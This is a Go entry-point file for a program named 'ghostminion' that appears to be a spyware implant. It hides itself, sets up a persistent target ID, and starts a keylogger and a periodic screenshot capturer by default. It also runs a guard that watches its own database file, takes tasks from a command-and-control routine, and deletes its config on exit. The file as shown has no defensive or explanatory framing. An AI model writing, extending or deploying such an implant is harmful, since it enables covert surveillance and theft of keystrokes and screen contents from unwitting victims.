package main

import (
	"ghostminion/apps"
	"ghostminion/communication"
	"ghostminion/config"
	"ghostminion/db"
	"ghostminion/hider"
	"ghostminion/logger"
	"ghostminion/persistence"
)

var (
	configInstance = config.GetInstance()
	_              = db.GetInstance()
	lgr            = logger.GetLogger()
)

func main() {

	defer func() {
		err := config.DeleteConfig()
		if err != nil {
			lgr.Error("couldn't delete config file", err)
		}
	}()

	defer lgr.Close()

	hider.Hide()

	targetId := persistence.GeTargetID()
	err := configInstance.Update(func(c *config.Config) {
		c.AgentID = targetId
	})
	if err != nil {
		lgr.Error("Error updating agent ID: " + err.Error())
	}

	lgr.Debug("targetId: %s", targetId)

	appManager := apps.GetAppManagerInstance()
	addApps(appManager)

	taskCh := make(chan apps.AppData)
	go communication.Routine(taskCh)
	// TODO: should be done in the task/app manager
	for task := range taskCh {
		// TODO: handle config change
		if app, err := apps.NewAppFactory(task); err != nil {
			lgr.Warn("could not make app from task err: %s", err.Error())
		} else {
			appManager.StartApp(task.Name, app)
		}
	}

	appManager.StopAll()
}

func addApps(appManager *apps.AppManager) {
	appManager.StartApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})

	app, err := apps.NewScreenshotApp(
		configInstance.Apps.Screenshot["Interval"].(int),
		configInstance.Apps.Screenshot["Quality"].(int),
	)
	if app != nil {
		appManager.StartApp(string(apps.ScreenShotTask)+"_default", app)
	} else if err != nil {
		lgr.Error("Error creating screenshot app err: %s", err.Error())
	}

	appManager.StartApp("security_guard", &apps.SecurityGuardApp{
		FilesExistence: []string{
			configInstance.Installation.DBPath,
		},
	})
}
